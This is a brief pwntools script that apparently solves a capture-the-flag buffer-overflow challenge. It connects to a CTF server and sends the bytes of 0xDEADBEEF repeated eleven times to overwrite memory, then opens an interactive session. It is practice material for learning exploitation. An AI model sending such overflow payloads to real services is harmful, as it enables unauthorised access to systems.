from pwn import *
r = remote("ctf.j0n9hyun.xyz", 3000)

#r = process("./bof_basic")
r.sendline(b"\xEF\xBE\xAD\xDE"*11)

#d = r.recv()
#print(d)

r.interactive()
